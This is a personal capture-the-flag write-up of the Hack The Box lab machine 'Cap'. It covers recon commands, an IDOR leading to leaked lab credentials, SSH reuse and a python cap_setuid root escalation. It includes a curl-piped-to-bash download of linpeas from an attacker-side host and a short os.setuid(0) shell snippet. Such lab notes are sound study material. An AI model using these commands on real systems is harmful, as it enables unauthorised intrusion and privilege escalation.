---
box: Cap
platform: HTB
os: Linux
difficulty: easy
ip:
date_started: 22/5/2026
date_rooted: 23/5/2026
time_taken: 4 hours
status: done
tags:
  -
---

# Cap

- **Path:** Web IDOR $\rightarrow$ Leaked Creds $\rightarrow$ SSH Login $\rightarrow$ Python Capabilities Root PE
    
- **Credentials:** `Nathan : Buck3tH4TF0RM3!`


## Recon

**Nmap**
```
nmap -T4 -F $IP
nmap -Pn -p- --min-rate 1000 -T4 $IP -oN allports.txt
nmap -sC -sV -p<open ports> -oA detailed_scan $IP
nmap -sU -F $IP // if got stuck
```
- **Port 21 (FTP):** vsftpd 3.0.3 (No anonymous access)
    
- **Port 22 (SSH):** Open (No password yet)
    
- **Port 80 (HTTP):** Gunicorn server $\rightarrow$ Means a **Python** backend (Flask/Django)


## Web & Foothold
*IDOR and pcap*
Do not forget negative values and zero during enumeration
Add:

```
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/...
```

and:

``` bash
Observe object references:
?id=1
/download/12
/view/5
Try:0 -1 9999 other users
```
## Enumeration
_Per-service findings. Web dirs, SMB shares, versions, default creds tried._

Ports found: FTP, SSH, Web 

**FTP**
`anonymous:` failed, pw required
found vstfp 3.0.3, quick check, not vulnerable

## Foothold
_How you got the initial shell. Exploit used, payload, command run._

IDOR -> leaked creds -> FTP -> SSH reuse 


## Privilege Escalation

_What user → what user. Tool used (linpeas/winpeas/etc), vector found, exploit._

> Core: find things with extra privilege, make it execute shell.

**Manual Discovery** 
Gunicorn indicates Python WSGI server
→ likely Flask/Django app
→ Python apps often store source in app.py/wsgi.py
→ check common locations:
/opt
/var/www
/home/*

→ found capability-enabled python binary
→ python has cap_setuid
→ can elevate via os.setuid(0)

**LinEnum**
```bash
# On host
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 8000

# In target
curl $ip:8000/linpeas.sh | bash 
# Better for report
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/linpeas_results.txt
```


Found vuln, exploit 
```
# command
python3 

import os; 
os.setuid(0);
os.system('sh')
```

**Key insight:** 

## Loot
- PASS:Buck3tH4TF0RM3!

## Lessons
_5 minutes. What did you learn? What would you do faster next time? What did you NOT know going in?_

1. Some Linux Hacks
```bash
During LinPeas, open another SSH window to poke around,
in fact, poke around during scan, dun waste time
```
2. The Enum techniques,  adaptive DFS: 
```bash
List all of the pages to explore, go one by one, stop when felt like its a rabbit hole and note down if all other didnt work out, come back to exploit with this method (fuzz)
```
3. Be familiar where my tools are, LinPea.sh, and be familar with the commands:
```bash
// to use an exploit on the server
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 8000

// then on the target
curl http://YOUR_IP:8000/linpeas.sh | bash
mv ~/Downloads .
```
4. To find something:
```bash
sudo updatedb
locate linpeas.sh
```
## Links to techniques
_Link to `Techniques/` notes for anything reusable._

**Web Application**

| Thing Seen        | Likely Meaning          | Pentest Thoughts                  |
| ----------------- | ----------------------- | --------------------------------- |
| *Gunicorn*          | *Python backend*          | *SSTI? Flask debug? Django issues?* |
| PHP/8.x           | PHP app                 | LFI, upload bypass, old CVEs      |
| Apache            | Traditional Linux stack | .htaccess, misconfigs             |
| Nginx             | Reverse proxy           | Alias traversal, proxy mistakes   |
| Node.js / Express | JavaScript backend      | Prototype pollution, JWT mistakes |
| Tomcat            | Java app                | WAR upload, manager panel         |
| IIS               | Windows/.NET            | ASPX shells, NTLM                 |
| WordPress         | CMS                     | Plugin exploits                   |
| Jenkins           | CI/CD                   | Script console RCE                |
| phpMyAdmin        | DB admin                | Weak creds                        |



## References
_Writeups, IppSec video, exploit-db links._

- IppSec video
